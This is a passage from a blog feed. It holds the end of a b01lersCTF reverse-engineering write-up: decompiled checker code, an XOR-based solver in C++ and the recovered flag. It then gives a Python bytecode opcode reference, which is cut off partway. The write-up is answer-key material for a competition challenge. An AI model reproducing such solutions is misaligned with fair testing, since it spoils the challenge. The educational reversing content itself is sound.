result;&#125;</code></pre><p>这又是一个异常复杂的函数，但实际上有用的内容并不多</p><pre><code class="c++">     a6 = 0LL;    a1 = 4294967185LL;    while ( 1 )    &#123;      v16 = (_BYTE *)(a6 + v15);      v17 = (unsigned __int8)*v16;      if ( (_BYTE)v17 == 10 )        break;      *v16 = a1 ^ v17;      v18 = (unsigned __int8)a1 + a6++;      v15 = *a5;      a1 = (unsigned int)v18         + (unsigned int)((unsigned __int64)(0x8080808080808081LL * (unsigned __int128)(unsigned __int64)v18 &gt;&gt; 64) &gt;&gt; 7);      a2 = a5[1] - *a5;      if ( a6 &gt;= a2 )        goto LABEL_5;    &#125;</code></pre><p>只有这里是对输入的处理，整个处理过程也就只有一个异或而已，这里比较有意思的是循环停止的判断条件，<code>a5</code>实际上是个数组，里面存放了两个地址，一个是我们输入的字符串开始的地址，另一个是结束的地址，实际上相减出来的值就是字符串的长度，但是看起来就比较复杂，逆向的时候理解起来就有些困难。</p><p>这里的处理其实很好办，<code>a1</code>这个值和我们的输入没关系，是循环中依据算法生成的，我们可以通过同样的算法生成，然后存放在一个数组里。</p><p>接下来是判断函数</p><pre><code class="c++">__int64 __fastcall sub_15A0(__int64 *a1)&#123;  _QWORD *v1; // rbp  __int64 v2; // rsi  __int64 v3; // rcx  __int64 v4; // rdx  unsigned int v5; // er12  const char *v6; // rdi  __int64 v7; // rdx  __int64 v8; // rcx  __int64 v10; // [rsp+0h] [rbp-158h]  __int64 v11; // [rsp+124h] [rbp-34h]  unsigned __int64 v12; // [rsp+138h] [rbp-20h]  __asm &#123; endbr64 &#125;  v12 = __readfsqword(0x28u);  qmemcpy(&amp;v10, &amp;unk_2220, 0x12CuLL);  v1 = (_QWORD *)sub_11D0(300LL);  *v1 = v10;  *(_QWORD *)((char *)v1 + 292) = v11;  qmemcpy(    (void *)((unsigned __int64)(v1 + 1) &amp; 0xFFFFFFFFFFFFFFF8LL),    (const void *)((char *)&amp;v10 - ((char *)v1 - ((unsigned __int64)(v1 + 1) &amp; 0xFFFFFFFFFFFFFFF8LL))),    8LL * (((unsigned int)v1 - (((_DWORD)v1 + 8) &amp; 0xFFFFFFF8) + 300) &gt;&gt; 3));  v2 = 0LL;  v3 = *a1;  v4 = a1[1] - *a1;  while ( 1 )  &#123;    if ( v2 == v4 )    &#123;      v6 = &quot;vector::_M_range_check: __n (which is %zu) &gt;= this-&gt;size() (which is %zu)&quot;;      sub_1230(&quot;vector::_M_range_check: __n (which is %zu) &gt;= this-&gt;size() (which is %zu)&quot;, v2, v2);      goto LABEL_10;    &#125;    if ( *((_BYTE *)v1 + 4 * v2) != *(_BYTE *)(v3 + v2) )      break;    if ( ++v2 == 75 )    &#123;      v5 = 1;      goto LABEL_6;    &#125;  &#125;  v5 = 0;LABEL_6:  v6 = (const char *)v1;  sub_11C0(v1, v2, v4, v3);  if ( __readfsqword(0x28u) != v12 )  &#123;LABEL_10:    sub_11E0(v6, v2, v7, v8);    __asm &#123; endbr64 &#125;    JUMPOUT(&amp;loc_129A);  &#125;  return v5;&#125;</code></pre><p>各种操作看着吓人，仔细一看，只有一个直接比较</p><pre><code class="c++">if ( *((_BYTE *)v1 + 4 * v2) != *(_BYTE *)(v3 + v2) )</code></pre><p>前面的生成方式很复杂，但是可以不用去管，通过动态调试就可以调试出来目标数组，不过目标生成出来都是64位数据，比较的时候只取最低8位进行比较，还需要进行一些处理。</p><p>然后直接把处理过后的目标数组和之前依据相同算法生成出来的数组逐项异或就可以得到flag</p><pre><code class="c++">#include &lt;iostream&gt;#include &quot;ida.h&quot;using namespace std;int main() &#123;    unsigned __int64 a5;    signed __int64 v8; // rdx    unsigned __int64 v11; // rcx    a5 = 0LL;    v8 = 0xFFFFFF91LL;    ll v8s[75];    v8s[0] = 0x91;    ll target[] = &#123;0xE1, 0xF2, 0xE6, 0xF2, 0xEC, 0xEF, 0xC8, 0x95, 0xF2, 0xD8, 0x8E, 0xAC, 0xE0, 0xAD, 0x82, 0xA5, 0x79,                   0x6E, 0x18, 0x09, 0x3D, 0x3B, 0x4A, 0xE1, 0xC1, 0x8F, 0xB9, 0xC2, 0x52, 0x5E, 0x72, 0x51, 0xDC, 0x92,                   0xAA, 0x90, 0x39, 0x40, 0x27, 0x4A, 0xC4, 0x97, 0xC0, 0x72, 0x18, 0x42, 0x96, 0xF7, 0xC5, 0x71, 0x3D,                   0xE4, 0x90, 0xA7, 0x5A, 0x0C, 0xA8, 0x8C, 0x6F, 0x74, 0xF1, 0xCA, 0xA4, 0x0A, 0x17, 0x8A, 0xA5, 0x54,                   0xEE, 0x9B, 0x3B, 0x69, 0xA3, 0xEF, 0x54&#125;;    while (a5 &lt; 75) &#123;        v11 = (unsigned __int8) v8 + a5++;        v8 = (unsigned int) v11 +             (unsigned int) ((unsigned __int64) (0x8080808080808081LL * (unsigned __int128) v11 &gt;&gt; 64) &gt;&gt; 7);        v8s[a5] = v8;    &#125;    string flag;    for (int i = 0; i &lt; 75; i++) &#123;        char tmp = target[i] ^v8s[i];        flag += tmp;    &#125;    cout &lt;&lt; flag &lt;&lt; endl;    return 0;&#125;</code></pre><p>输出的flag为</p><pre><code>pctf&#123;th3_m0d3rn_st34m_3ng1n3_w45_1nv3nt3d_1n_1698_buT_th3_b3st_0n3_in_1940&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> b01lersCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python_opcode</title>
      <link href="/2020/03/13/python-opcode/"/>
      <url>/2020/03/13/python-opcode/</url>
      
        <content type="html"><![CDATA[<p>把python的opcode在这里记录，便于查表</p><span id="more"></span><h4 id="Opcode"><a href="#Opcode" class="headerlink" title="Opcode"></a>Opcode</h4><pre><code class="c++">/* Auto-generated by Tools/scripts/generate_opcode_h.py from Lib/opcode.py */#ifndef Py_OPCODE_H#define Py_OPCODE_H#ifdef __cplusplusextern &quot;C&quot; &#123;#endif    /* Instruction opcodes for compiled code */#define POP_TOP                   1#define ROT_TWO                   2#define ROT_THREE                 3#define DUP_TOP                   4#define DUP_TOP_TWO               5#define ROT_FOUR                  6#define NOP                       9#define UNARY_POSITIVE           10#define UNARY_NEGATIVE           11#define UNARY_NOT                12#define UNARY_INVERT             15#define BINARY_MATRIX_MULTIPLY   16#define INPLACE_MATRIX_MULTIPLY  17#define BINARY_POWER             19#define BINARY_MULTIPLY          20#define BINARY_MODULO            22#define BINARY_ADD               23#define BINARY_SUBTRACT          24#define BINARY_SUBSCR            25#define BINARY_FLOOR_DIVIDE      26#define BINARY_TRUE_DIVIDE       27#define INPLACE_FLOOR_DIVIDE     28#define INPLACE_TRUE_DIVIDE      29#define RERAISE                  48#define WITH_EXCEPT_START        49#define GET_AITER                50#define GET_ANEXT                51#define BEFORE_ASYNC_WITH        52#define END_ASYNC_FOR            54#define INPLACE_ADD              55#define INPLACE_SUBTRACT         56#define INPLACE_MULTIPLY         57#define INPLACE_MODULO           59#define STORE_SUBSCR             60#define DELETE_SUBSCR            61#define BINARY_LSHIFT            62#define BINARY_RSHIFT            63#define BINARY_AND               64#define BINARY_XOR               65#define BINARY_OR                66#define INPLACE_POWER            67#define GET_ITER                 68#define GET_YIELD_FROM_ITER      69#define PRINT_EXPR               70#define LOAD_BUILD_CLASS         71#define YIELD_FROM               72#define GET_AWAITABLE            73#define LOAD_ASSERTION_ERROR     74#define INPLACE_LSHIFT           75#define INPLACE_RSHIFT           76#define INPLACE_AND              77#define INPLACE_XOR              78#define INPLACE_OR               79#define LIST_TO_TUPLE            82#define RETURN_VALUE             83#define IMPORT_STAR              84#define SETUP_ANNOTATIONS        85#define YIELD_VALUE              86#define POP_BLOCK                87#define POP_EXCEPT               89#define HAVE_ARGUMENT            90#define STORE_NAME               90#define DELETE_NAME              91#define UNPACK_SEQUENCE          92#define FOR_ITER                 93#define UNPACK_EX                94#define STORE_ATTR               95#define DELETE_ATTR              96#define STORE_GLOBAL             97#define DELETE_GLOBAL            98#define LOAD_CONST              100#define LOAD_NAME               101#define BUILD_TUPLE             102#define BUILD_LIST              103#define BUILD_SET               104#define BUILD_MAP               105#define LOAD_ATTR               106#define COMPARE_OP              107#define IMPORT_NAME             108#define IMPORT_FROM             109#define JUMP_FORWARD            110#define JUMP_IF_FALSE_OR_POP    111#define JUMP_IF_TRUE_OR_POP     112#define JUMP_ABSOLUTE           113#define POP_JUMP_IF_FALSE       114#define POP_JUMP_IF_TRUE        115#define LOAD_GLOBAL             116#define IS_OP                   117#define CONTAINS_OP             118#define JUMP_IF_NOT_EXC_MATCH   121#define SETUP_FINALLY           122#define LOAD_FAST               124#define STORE_FAST              125#define DELETE_FAST             126#define RAISE_VARARGS           130#define CALL_FUNCTION           131#define MAKE_FUNCTION           132#define BUILD_SLICE             133#define LOAD_CLOSURE            135#define LOAD_DEREF              136#define STORE_DEREF             137#define DELETE_DEREF            138#define CALL_FUNCTION_KW        141#define CALL_FUNCTION_EX        142#define SETUP_WITH              143#define EXTENDED_ARG            144#define LIST_APPEND             145#define SET_ADD                 146#define MAP_ADD                 147#define LOAD_CLASSDEREF         148#define SETUP_ASYNC_WITH        154#define FORMAT_VALUE            155#define BUILD_CONST_KEY_MAP     156#define BUILD_STRING            157#define LOAD_METHOD             160#define CALL_METHOD             161#define LIST_EXTEND             162#define SET_UPDATE              163#define DICT_MERGE              164#define DICT_UPDATE             165/* EXCEPT_HANDLER is a special, implicit block type which is created when   entering an except handler. It is not an opcode but we define it here   as we want it to be available to both frameobject.c and ceval.c, while   remaining private.*/#define EXCEPT_HANDLER 257#define HAS_ARG(op) ((op) &gt;= HAVE_ARGUMENT)#ifdef __cplusplus&#125;#endif#endif /* !Py_OPCODE_H */</code></pre><p>对应指令的含义如下：</p><h4 id="Bytecode-Instructions"><a href="#Bytecode-Instructions" class="headerlink" title="Bytecode Instructions"></a>Bytecode Instructions</h4><p>The Python compiler currently generates the following bytecode instructions.</p><ul><li><p><code>STOP_CODE</code>()</p><p>Indicates end-of-code to the compiler, not used by the interpreter.</p></li><li><p><code>NOP</code>()</p><p>Do nothing code. Used as a placeholder by the bytecode optimizer.</p></li><li><p><code>POP_TOP</code>()</p><p>Removes the top-of-stack (TOS) item.</p></li><li><p><code>ROT_TWO</code>()</p><p>Swaps the two top-most stack items.</p></li><li><p><code>ROT_THREE</code>()</p><p>Lifts second and third stack item one position up, moves top down to position three.</p></li><li><p><code>ROT_FOUR</code>()</p><p>Lifts second, third and forth stack item one position up, moves top down to position four.</p></li><li><p><code>DUP_TOP</code>()</p><p>Duplicates the reference on top of the stack.</p></li></ul><p>Unary Operations take the top of the stack, apply the operation, and push the result back on the stack.</p><ul><li><p><code>UNARY_POSITIVE</code>()</p><p>Implements <code>TOS = +TOS</code>.</p></li><li><p><code>UNARY_NEGATIVE</code>()</p><p>Implements <code>TOS = -TOS</code>.</p></li><li><p><code>UNARY_NOT</code>()</p><p>Implements <code>TOS = not TOS</code>.</p></li><li><p><code>UNARY_CONVERT</code>()</p><p>Implements <code>TOS = </code>TOS``.</p></li><li><p><code>UNARY_INVERT</code>()</p><p>Implements <code>TOS = ~TOS</code>.</p></li><li><p><code>GET_ITER</code>()</p><p>Implements <code>TOS = iter(TOS)</code>.</p></li></ul><p>Binary operations remove the top of the stack (TOS) and the second top-most stack item (TOS1) from the stack. They perform the operation, and put the result back on the stack.</p><ul><li><p><code>BINARY_POWER</code>()</p><p>Implements <code>TOS = TOS1 ** TOS</code>.</p></li><li><p><code>BINARY_MULTIPLY</code>()</p><p>Implements <code>TOS = TOS1 * TOS</code>.</p></li><li><p><code>BINARY_DIVIDE</code>()</p><p>Implements <code>TOS = TOS1 / TOS</code> when <code>from __future__ import division</code> is not in effect.</p></li><li><p><code>BINARY_FLOOR_DIVIDE</code>()</p><p>Implements <code>TOS = TOS1 // TOS</code>.</p></li><li><p><code>BINARY_TRUE_DIVIDE</code>()</p><p>Implements <code>TOS = TOS1 / TOS</code> when <code>from __future__ import division</code> is in effect.</p></li><li><p><code>BINARY_MODULO</code>()</p><p>Implements <code>TOS = TOS1 % TOS</code>.</p></li><li><p><code>BINARY_ADD</code>()</p><p>Implements <code>TOS = TOS1 + TOS</code>.</p></li><li><p><code>BINARY_SUBTRACT</code>()</p><p>Implements <code>TOS = TOS1 - TOS</code>.</p></li><li><p><code>BINARY_SUBSCR</code>()</p><p>Implements <code>TOS = TOS1[TOS]</code>.</p></li><li><p><code>BINARY_LSHIFT</code>()</p><p>Implements <code>TOS = TOS1 &lt;&lt; TOS</code>.</p></li><li><p><code>BINARY_RSHIFT</code>()</p><p>Implements <code>TOS = TOS1 &gt;&gt; TOS</code>.</p></li><li><p><code>BINARY_AND</code>()</p><p>Implements <code>TOS = TOS1 &amp; TOS</code>.</p></li><li><p><code>BINARY_XOR</code>()</p><p>Implements <code>TOS = TOS1 ^ TOS</code>.</p></li><li><p><code>BINARY_OR</code>()</p><p>Implements <code>TOS = TOS1 | TOS</code>.</p></li></ul><p>In-place operations are like binary operations, in that they remove TOS and TOS1, and push the result back on the stack, but the operation is done in-place when TOS1 supports it, and the resulting TOS may be (but does not have to be) the original TOS1.</p><ul><li><p><code>INPLACE_POWER</code>()</p><p>Implements in-place <code>TOS = TOS1 ** TOS</code>.</p></li><li><p><code>INPLACE_MULTIPLY</code>()</p><p>Implements in-place <code>TOS = TOS1 * TOS</code>.</p></li><li><p><code>INPLACE_DIVIDE</code>()</p><p>Implements in-place <code>TOS = TOS1 / TOS</code> when <code>from __future__ import division</code> is not in effect.</p></li><li><p><code>INPLACE_FLOOR_DIVIDE</code>()</p><p>Implements in-place <code>TOS = TOS1 // TOS</code>.</p></li><li><p><code>INPLACE_TRUE_DIVIDE</code>()</p><p>Implements in-place <code>TOS = TOS1 / TOS</code> when <code>from __future__ import division</code> is in effect.</p></li><li><p><code>INPLACE_MODULO</code>()</p><p>Implements in-place <code>TOS = TOS1 % TOS</code>.</p></li><li><p><code>INPLACE_ADD</code>()</p><p>Implements in-place <code>TOS = TOS1 + TOS</code>.</p></li><li><p><code>INPLACE_SUBTRACT</code>()</p><p>Implements in-place <code>TOS = TOS1 - TOS</code>.</p></li><li><p><code>INPLACE_LSHIFT</code>()</p><p>Implements in-place <code>TOS = TOS1 &lt;&lt; TOS</code>.</p></li><li><p><code>INPLACE_RSHIFT</code>()</p><p>Implements in-place <code>TOS = TOS1 &gt;&gt; TOS</code>.</p></li><li><p><code>INPLACE_AND</code>()</p><p>Implements in-place <code>TOS = TOS1 &amp; TOS</code>.</p></li><li><p><code>INPLACE_XOR</code>()</p><p>Implements in-place <code>TOS = TOS1 ^ TOS</code>.</p></li><li><p><code>INPLACE_OR</code>()</p><p>Implements in-place <code>TOS = TOS1 | TOS</code>.</p></li></ul><p>The slice opcodes take up to three parameters.</p><ul><li><p><code>SLICE+0</code>()</p><p>Implements <code>TOS = TOS[:]</code>.</p></li><li><p><code>SLICE+1</code>()</p><p>Implements <code>TOS = TOS1[TOS:]</code>.</p></li><li><p><code>SLICE+2</code>()</p><p>Implements <code>TOS = TOS1[:TOS]</code>.</p></li><li><p><code>SLICE+3</code>()</p><p>Implements <code>TOS = TOS2[TOS1:TOS]</code>.</p></li></ul><p>Slice assignment needs even an additional parameter. As any statement, they put nothing on the stack.</p><ul><li><p><code>STORE_SLICE+0</code>()</p><p>Implements <code>TOS[:] = TOS1</code>.</p></li><li><p><code>STORE_SLICE+1</code>()</p><p>Implements <code>TOS1[TOS:] = TOS2</code>.</p></li><li><p><code>STORE_SLICE+2</code>()</p><p>Implements <code>TOS1[:TOS] = TOS2</code>.</p></li><li><p><code>STORE_SLICE+3</code>()</p><p>Implements <code>TOS2[TOS1:TOS] = TOS3</code>.</p></li><li><p><code>DELETE_SLICE+0</code>()</p><p>Implements <code>del TOS[:]</code>.</p></li><li><p><code>DELETE_SLICE+1</code>()</p><p>Implements <code>del TOS1[TOS:]</code>.</p></li><li><p><code>DELETE_SLICE+2</code>()</p><p>Implements <code>del TOS1[:TOS]</code>.</p></li><li><p><code>DELETE_SLICE+3</code>()</p><p>Implements <code>del TOS2[TOS1:TOS]</code>.</p></li><li><p><code>STORE_SUBSCR</code>()</p><p>Implements <code>TOS1[TOS] = TOS2</code>.</p></li><li><p><code>DELETE_SUBSCR</code>()</p><p>Implements <code>del TOS1[TOS]</code>.</p></li></ul><p>Miscellaneous opcodes.</p><ul><li><p><code>PRINT_EXPR</code>()</p><p>Implements the expression statement for the interactive mode. TOS is removed from the stack and printed. In non-interactive mode, an expression statement is terminated with <a href="https://docs.python.org/2/library/dis.html#opcode-POP_TOP"><code>POP_TOP</code></a>.</p></li><li><p><code>PRINT_ITEM</code>()</p><p>Prints TOS to the file-like object bound to <code>sys.stdout</code>. There is one such instruction for each item in the <a href="https://docs.python.org/2/reference/simple_stmts.html#print"><code>print</code></a> statement.</p></li><li><p><code>PRINT_ITEM_TO</code>()</p><p>Like <code>PRINT_ITEM</code>, but prints the item second from TOS to the file-like object at TOS. This is used by the extended print statement.</p></li><li><p><code>PRINT_NEWLINE</code>()</p><p>Prints a new line on <code>sys.stdout</code>. This is generated as the last operation of a <a href="https://docs.python.org/2/reference/simple_stmts.html#print"><code>print</code></a> statement, unless the statement ends with a comma.</p></li><li><p><code>PRINT_NEWLINE_TO</code>()</p><p>Like <code>PRINT_NEWLINE</code>, but prints the new line on the file-like object on the TOS. This is used by the extended print statement.</p></li><li><p><code>BREAK_LOOP</code>()</p><p>Terminates a loop due to a <a href="https://docs.python.org/2/reference/simple_stmts.html#break"><code>break</code></a> statement.</p></li><li><p><code>CONTINUE_LOOP</code>(<em>target</em>)</p><p>Continues a loop due to a <a href="https://docs.python.org/2/reference/simple_stmts.html#continue"><code>continue</code></a> statement. <em>target</em> is the address to jump to (which should be a <a href="https://docs.python.org/2/library/dis.html#opcode-FOR_ITER"><code>FOR_ITER</code></a> instruction).</p></li><li><p><code>LIST_APPEND</code>(<em>i</em>)</p><p>Calls <code>list.append(TOS[-i], TOS)</code>. Used to implement list comprehensions. While the appended value is popped off, the list object remains on the stack so that it is available for further iterations of the loop.</p></li><li><p><code>LOAD_LOCALS</code>()</p><p>Pushes a reference to the locals of the current scope on the stack. This is used in the code for a class definition: After the class body is evaluated, the locals are passed to the class definition.</p></li><li><p><code>RETURN_VALUE</code>()</p><p>Returns with TOS to the caller of the function.</p></li><li><p><code>YIELD_VALUE</code>()</p><p>Pops <code>TOS</code> and yields it from a <a href="https://docs.python.org/2/glossary.html#term-generator">generator</a>.</p></li><li><p><code>IMPORT_STAR</code>()</p><p>Loads all symbols not starting with <code>&#39;_&#39;</code> directly from the module TOS to the local namespace. The module is popped after loading all names. This opcode implements <code>from module import *</code>.</p></li><li><p><code>EXEC_STMT</code>()</p><p>Implements <code>exec TOS2,TOS1,TOS</code>. The compiler fills missing optional parameters with <code>None</code>.</p></li><li><p><code>POP_BLOCK</code>()</p><p>Removes one block from the block stack. Per frame, there is a stack of blocks, denoting nested loops, try statements, and such.</p></li><li><p><code>END_FINALLY</code>()</p><p>Terminates a <a href="https://docs.python.org/2/reference/compound_stmts.html#finally"><code>finally</code></a> clause. The interpreter recalls whether the exception has to be re-raised, or whether the function returns, and continues with the outer-next block.</p></li><li><p><code>BUILD_CLASS</code>()</p><p>Creates a new class object. TOS is the methods dictionary, TOS1 the tuple of the names of the base classes, and TOS2 the class name.</p></li><li><p><code>SETUP_WITH</code>(<em>delta</em>)</p><p>This opcode performs several operations before a with block starts. First, it loads <a href="https://docs.python.org/2/reference/datamodel.html#object.__exit__"><code>__exit__()</code></a> from the context manager and pushes it onto the stack for later use by <a href="https://docs.python.org/2/library/dis.html#opcode-WITH_CLEANUP"><code>WITH_CLEANUP</code></a>. Then, <a href="https://docs.python.org/2/reference/datamodel.html#object.__enter__"><code>__enter__()</code></a> is called, and a finally block pointing to <em>delta</em> is pushed. Finally, the result of calling the enter method is pushed onto the stack. The next opcode will either ignore it (<a href="https://docs.python.org/2/library/dis.html#opcode-POP_TOP"><code>POP_TOP</code></a>), or store it in (a) variable(s) (<a href="https://docs.python.org/2/library/dis.html#opcode-STORE_FAST"><code>STORE_FAST</code></a>, <a href="https://docs.python.org/2/library/dis.html#opcode-STORE_NAME"><code>STORE_NAME</code></a>, or <a href="https://docs.python.org/2/library/dis.html#opcode-UNPACK_SEQUENCE"><code>UNPACK_SEQUENCE</code></a>).</p></li><li><p><code>WITH_CLEANUP</code>()</p><p>Cleans up the stack when a <a href="https://docs.python.org/2/reference/compound_stmts.html#with"><code>with</code></a> statement block exits. On top of the stack are 1–3 values indicating how/why the finally clause was entered:TOP = <code>None</code>(TOP, SECOND) = (<code>WHY_&#123;RETURN,CONTINUE&#125;</code>), retvalTOP = <code>WHY_*</code>; no retval below it(TOP, SECOND, THIRD) = exc_info()Under them is EXIT, the context manager’s <a href="https://docs.python.org/2/reference/datamodel.html#object.__exit__"><code>__exit__()</code></a> bound method.In the last case, <code>EXIT(TOP, SECOND, THIRD)</code> is called, otherwise <code>EXIT(None, None, None)</code>.EXIT is removed from the stack, leaving the values above it in the same order. In addition, if the stack represents an exception, <em>and</em> the function call returns a ‘true’ value, this information is “zapped”, to prevent <code>END_FINALLY</code> from re-raising the exception. (But non-local gotos should still be resumed.)</p></li></ul><p>All of the following opcodes expect arguments. An argument is two bytes, with the more significant byte last.</p><ul><li><p><code>STORE_NAME</code>(<em>namei</em>)</p><p>Implements <code>name = TOS</code>. <em>namei</em> is the index of <em>name</em> in the attribute <code>co_names</code> of the code object. The compiler tries to use <code>STORE_FAST</code> or <code>STORE_GLOBAL</code> if possible.</p></li><li><p><code>DELETE_NAME</code>(<em>namei</em>)</p><p>Implements <code>del name</code>, where <em>namei</em> is the index into <code>co_names</code> attribute of the code object.</p></li><li><p><code>UNPACK_SEQUENCE</code>(<em>count</em>)</p><p>Unpacks TOS into <em>count</em> individual values, which are put onto the stack right-to-left.</p></li><li><p><code>DUP_TOPX</code>(<em>count</em>)</p><p>Duplicate <em>count</em> items, keeping them in the same order. Due to implementation limits, <em>count</em> should be between 1 and 5 inclusive.</p></li><li><p><code>STORE_ATTR</code>(<em>namei</em>)</p><p>Implements <code>TOS.name = TOS1</code>, where <em>namei</em> is the index of name in <code>co_names</code>.</p></li><li><p><code>DELETE_ATTR</code>(<em>namei</em>)</p><p>Implements <code>del TOS.name</code>, using <em>namei</em> as index into <code>co_names</code>.</p></li><li><p><code>STORE_GLOBAL</code>(<em>namei</em>)</p><p>Works as <code>STORE_NAME</code>, but stores the name as a global.</p></li><li><p><code>DELETE_GLOBAL</code>(<em>namei</em>)</p><p>Works as <code>DELETE_NAME</code>, but deletes a global name.</p></li><li><p><code>LOAD_CONST</code>(<em>consti</em>)</p><p>Pushes <code>co_consts[consti]</code> onto the stack.</p></li><li><p><code>LOAD_NAME</code>(<em>namei</em>)</p><p>Pushes the value associated with <code>co_names[namei]</code> onto the stack.</p></li><li><p><code>BUILD_TUPLE</code>(<em>count</em>)</p><p>Creates a tuple consuming <em>count</em> items from the stack, and pushes the resulting tuple onto the stack.</p></li><li><p><code>BUILD_LIST</code>(<em>count</em>)</p><p>Works as <code>BUILD_TUPLE</code>, but creates a list.</p></li><li><p><code>BUILD_SET</code>(<em>count</em>)</p><p>Works as <code>BUILD_TUPLE</code>, but creates a set.<em>New in version 2.7.</em></p></li><li><p><code>BUILD_MAP</code>(<em>count</em>)</p><p>Pushes a new dictionary object onto the stack. The dictionary is pre-sized to hold <em>count</em> entries.</p></li><li><p><code>LOAD_ATTR</code>(<em>namei</em>)</p><p>Replaces TOS with <code>getattr(TOS, co_names[namei])</code>.</p></li><li><p><code>COMPARE_OP</code>(<em>opname</em>)</p><p>Performs a Boolean operation. The operation name can be found in <code>cmp_op[opname]</code>.</p></li><li><p><code>IMPORT_NAME</code>(<em>namei</em>)</p><p>Imports the module <code>co_names[namei]</code>. TOS and TOS1 are popped and provide the <em>fromlist</em> and <em>level</em> arguments of <a href="https://docs.python.org/2/library/functions.html#__import__"><code>__import__()</code></a>. The module object is pushed onto the stack. The current namespace is not affected: for a proper import statement, a subsequent <code>STORE_FAST</code> instruction modifies the namespace.</p></li><li><p><code>IMPORT_FROM</code>(<em>namei</em>)</p><p>Loads the attribute <code>co_names[namei]</code> from the module found in TOS. The resulting object is pushed onto the stack, to be subsequently stored by a <code>STORE_FAST</code> instruction.</p></li><li><p><code>JUMP_FORWARD</code>(<em>delta</em>)</p><p>Increments bytecode counter by <em>delta</em>.</p></li><li><p><code>POP_JUMP_IF_TRUE</code>(<em>target</em>)</p><p>If TOS is true, sets the bytecode counter to <em>target</em>. TOS is popped.</p></li><li><p><code>POP_JUMP_IF_FALSE</code>(<em>target</em>)</p><p>If TOS is false, sets the bytecode counter to <em>target</em>. TOS is popped.</p></li><li><p><code>JUMP_IF_TRUE_OR_POP</code>(<em>target</em>)</p><p>If TOS is true, sets the bytecode counter to <em>target</em> and leaves TOS on the stack. Otherwise (TOS is false), TOS is popped.</p></li><li><p><code>JUMP_IF_FALSE_OR_POP</code>(<em>target</em>)</p><p>If TOS is false, sets the bytecode counter to <em>target</em> and leaves TOS on the stack. Otherwise (TOS is true), TOS is popped.</p></li><li><p><code>JUMP_ABSOLUTE</code>(<em>target</em>)</p><p>Set bytecode counter to <em>target</em>.</p></li><li><p><code>FOR_ITER</code>(<em>delta</em>)</p><p><code>TOS</code> is an <a href="https://docs.python.org/2/glossary.html#term-iterator">iterator</a>. Call its <code>next()</code> method. If this yields a new value, push it on the stack (leaving the iterator below it). If the iterator indicates it is exhausted <code>TOS</code> is popped, and the bytecode counter is incremented by <em>delta</em>.</p></li><li><p><code>LOAD_GLOBAL</code>(<em>namei</em>)</p><p>Loads the global named <code>co_names[namei]</code> onto the stack.</p></li><li><p><code>SETUP_LOOP</code>(<em>delta</em>)</p><p>Pushes a block for a loop onto the block stack. The block spans from the current instruction with a size of <em>delta</em> bytes.</p></li><li><p><code>SETUP_EXCEPT</code>(<em>delta</em>)</p><p>Pushes a try block from a try-except clause onto the block stack. <em>delta</em> points to the first except block.</p></li><li><p><code>SETUP_FINALLY</code>(<em>delta</em>)</p><p>Pushes a try block from a try-except clause onto the block stack. <em>delta</em> points to the finally block.</p></li><li><p><code>STORE_MAP</code>()</p><p>Store a key and value pair in a dictionary. Pops the key and value while leaving the dictionary on the stack.</p></li><li><p><code>LOAD_FAST</code>(<em>var_num</em>)</p><p>Pushes a reference to the local <code>co_varnames[var_num]</code> onto the stack.</p></li><li><p><code>STORE_FAST</code>(<em>var_num</em>)</p><p>Stores TOS into the local <code>co_varnames[var_num]</code>.</p></li><li><p><code>DELETE_FAST</code>(<em>var_num</em>)</p><p>Deletes local <code>co_varnames[var_num]</code>.</p></li><li><p><code>LOAD_CLOSURE</code>(<em>i</em>)</p><p>Pushes a reference to the cell contained in slot <em>i</em> of the cell and free variable storage. The name of the variable is <code>co_cellvars[i]</code> if <em>i</em> is less than the length of <em>co_cellvars</em>. Otherwise it is <code>co_freevars[i - len(co_cellvars)]</code>.</p></li><li><p><code>LOAD_DEREF</code>(<em>i</em>)</p><p>Loads the cell contained in slot <em>i</em> of the cell and free variable storage. Pushes a reference to the object the cell contains on the stack.</p></li><li><p><code>STORE_DEREF</code>(<em>i</em>)</p><p>Stores TOS into the cell contained in slot <em>i</em> of the cell and free variable storage.</p></li><li><p><code>SET_LINENO</code>(<em>lineno</em>)</p><p>This opcode is obsolete.</p></li><li><p><code>RAISE_VARARGS</code>(<em>argc</em>)</p><p>Raises an exception. <em>argc</em> indicates the number of arguments to the raise statement, ranging from 0 to 3. The handler will find the traceback as TOS2, the parameter as TOS1, and the exception as TOS.</p></li><li><p><code>CALL_FUNCTION</code>(<em>argc</em>)</p><p>Calls a callable object. The low byte of <em>argc</em> indicates the number of positional arguments, the high byte the number of keyword arguments. The stack contains keyword arguments on top (if any), then the positional arguments below that (if any), then the callable object to call below that. Each keyword argument is represented with two values on the stack: the argument’s name, and its value, with the argument’s value above the name on the stack. The positional arguments are pushed in the order that they are passed in to the callable object, with the right-most positional argument on top. <code>CALL_FUNCTION</code> pops all arguments and the callable object off the stack, calls the callable object with those arguments, and pushes the return value returned by the callable object.</p></li><li><p><code>MAKE_FUNCTION</code>(<em>argc</em>)</p><p>Pushes a new function object on the stack. TOS is the code associated with the function. The function object is defined to have <em>argc</em> default parameters, which are found below TOS.</p></li><li><p><code>MAKE_CLOSURE</code>(<em>argc</em>)</p><p>Creates a new function object, sets its <em>func_closure</em> slot, and pushes it on the stack. TOS is the code associated with the function, TOS1 the tuple containing cells for the closure’s free variables. The function also has <em>argc</em> default parameters, which are found below the cells.</p></li><li><p><code>BUILD_SLICE</code>(<em>argc</em>)</p><p>Pushes a slice object on the stack. <em>argc</em> must be 2 or 3. If it is 2, <code>slice(TOS1, TOS)</code> is pushed; if it is 3, <code>slice(TOS2, TOS1, TOS)</code> is pushed. See the <a href="https://docs.python.org/2/library/functions.html#slice"><code>slice()</code></a> built-in function for more information.</p></li><li><p><code>EXTENDED_ARG</code>(<em>ext</em>)</p><p>Prefixes any opcode which has an argument too big to fit into the default two bytes. <em>ext</em> holds two additional bytes which, taken together with the subsequent opcode’s argument, comprise a four-byte argument, <em>ext</em> being the two most-significant bytes.</p></li><li><p><code>CALL_FUNCTION_VAR</code>(<em>argc</em>)</p><p>Calls a callable object, similarly to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. <em>argc</em> represents the number of keyword and positional arguments, identically to <a href="https://docs.python.org/2/library/dis.html#opcode-CALL_FUNCTION"><code>CALL_FUNCTION</code></a>. The top of the stack contains an iterable object 